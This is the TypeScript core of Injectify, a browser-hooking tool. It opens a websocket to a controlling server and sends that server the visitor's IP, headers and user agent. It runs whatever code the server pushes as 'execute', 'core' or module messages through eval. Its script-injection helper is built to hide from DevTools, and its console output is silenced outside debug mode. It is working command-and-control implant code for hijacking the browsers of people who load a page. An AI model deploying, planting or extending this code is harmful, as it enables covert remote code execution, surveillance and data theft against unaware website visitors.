declare var ws: any
declare var client: any

/**
 * Injectify core API
 * @class
 */

window['injectify'] = class Injectify {
	/**
	 * Overrides the message handler for the websocket connection
	 * @param {function} callback Callback to be triggered once message received
	 */
	static listener(callback) {
		ws.onmessage = message => {
			try {
				let data = JSON.parse(message.data)
				if (this['listeners'] && data.t && this['listeners'][data.t]) {
					/**
					 * Pre-process some topic's data
					 */
					if (data.t == 'pong') {
						data.d = +new Date - data.d
					}
					/**
					 * Callback the listeners
					 */
					this['listeners'][data.t].callback(data.d)
					if (this['listeners'][data.t].once) delete this['listeners'][data.t]
				} else {
					callback(data.d, data.t)
				}
			} catch(e) {
				if (this.debug) throw e
				this.error(e.stack)
			}
		}
	}
	/**
	 * Listen for a topic from websocket connection
	 * @param {string} topic Topic name to listen to
	 * @param {function} callback Callback to be triggered once topic received
	 */
	static listen(topic: string, callback, once?: boolean) {
		if (!once) once = false
		if (!this['listeners']) this['listeners'] = {}
		this['listeners'][topic] = {
			callback: data => {
				callback(data)
			},
			raw: callback,
			once: once
		}
	}
	/**	
	 * Unhook a websocket topic listener
	 * @param {string} topic Topic name to unlisten
	 * @param {function} callback
	 */
	static unlisten(topic: string, callback?: any) {
		if (!this['listeners'] ||
			!this['listeners'][topic] ||
			!this['listeners'][topic].callback ||
			!this['listeners'][topic].raw ||
			(
				callback &&
				callback.toString() !== this['listeners'][topic].raw.toString()
			)
		) return false
		return delete this['listeners'][topic]
	}
	/**
	 * Send data to websocket
	 * @param {string} topic Message topic
	 * @param {Object} data Message data
	 */
	static send(topic: string, data?: any) {
		// If the websocket is dead, return
		if (ws.readyState == 0) return
		try {
			ws.send(JSON.stringify({
				t: topic,
				d: data,
			}))
		} catch(e) {
			if (this.debug) throw e
			this.error(e.stack)
		}
	}
	/**
	 * Log data to websocket connection (and locally)
	 * @param {(Object|string)} message Data to be logged
	 * @param {boolean} local Whether to log it in the local console
	 */
	static log(message: any, local?: boolean) {
		this.send('r', message)
		if (local) console.log(message)
	}
	/**
	 * Get the websocket ping time (in milliseconds)
	 * @param {function} callback Callback to be executed on ping complete
	 */
	static ping(callback?: any) {
		this.send('ping', + new Date())
		if (callback) this.listen('pong', callback, true)
	}
	/**
	 * Safely execute a script with hidden context. Appears as 'VMXXX:1' in DevTools
	 * @param {string} func the contents inside the <script> tag
	 * @param {element} targetParent element to execute the script under, defaults to document.head
	 */
	static exec(func, targetParent?: any) {
		if (!targetParent) targetParent = document.head
		if (typeof func == 'function') func = '(' + func.toString() + ')()'
		var script = document.createElement('script')
		script.innerHTML = func
		targetParent.appendChild(script)
		targetParent.removeChild(script)
	}
	/**
	 * Loads a module from the injectify server
	 * @param {string} name module name
	 * @param {(string|Object)} params parameters to be sent to the module
	 * @param {function} callback optional callback once the module has been loaded
	 */
	static module(name, params?: any, callback?: any) {
		if (typeof params === 'function') callback = params
		if (typeof callback === 'function') window["callbackFor" + name] = callback
		this.send('module', {
			name: name,
			params: params
		})
	}
	/**
	 * Check that the Injectify core is active
	 */
	static get present() {
		return true
	}
	/**
	 * Returns information about Injectify
	 */
	static get info() {
		var project = ws.url.split('?')[1]
		if (this.debug) project = project.substring(1)
		return {
			'project'    : atob(project),
			'debug'      : this.debug,
			'websocket'  : ws.url,
			'ip'         : client.ip,
			'headers'    : client.headers,
			'user-agent' : client.agent,
			'connectTime': client.connectTime
		}
	}
	/**
	 * Returns whether injectify is in debug mode or not
	 * true  - being used in development
	 * false - console output should be suppressed
	 */
	static get debug() {
		return ws.url.split('?')[1].charAt(0) == "$"
	}
	/**
	 * Returns the amount of time connected to injectify server
	 */
	static get duration() {
		let duration = (+new Date - this.info.connectTime) / 1000
		return Math.round(duration)
	}
	/**
	 * Error handler
	 * @param {error} error The error to be handled
	 */
	static error(error) {
		this.send('e', error)
	}
}

/**
 * Debug helpers
 */

if (window['injectify'].debug) {
	console.warn('⚡️ Injectify core.js loaded! --> https://github.com/samdenty99/injectify', window['injectify'].info)
}

/**
 * Replace the basic websocket handler with a feature-rich one
 */
window['injectify'].listener((data, topic) => {
	try {
		if (topic == 'error') {
			console.error(data)
			return
		}
		if (/^module:/.test(topic)) {
			var module = {
				name: topic.substring(7),
				callback: window["callbackFor" + topic.substring(7)],
				returned: undefined,
				config: {
					async: false
				}
			}

			if (data !== false) {
				eval(data)
				if (window['injectify'].debug) {
					console.warn('📦 Executed module "' + module.name + '"', module)
				}
				if (!module.config.async && data !== false && typeof module.callback == 'function') {
					module.callback(module.returned)
				}
				return delete window["callbackFor" + module.name]
			} else if (window['injectify'].debug) {
				console.error('📦 Module "' + module.name + '" not installed on server', module)
			}
		}
		if (topic == 'execute' || topic == 'core') {
			eval(data)
		}
	} catch(e) {
		// if (window['injectify'].debug) {
		// 	//throw e
		// }
		window['injectify'].error(e.stack)
	}
})

/**
 * Ping the server every 5 seconds to sustain the connection
 */
clearInterval(window['ping'])
window['ping'] = setInterval(() => {
	window['injectify'].ping()
}, 5000)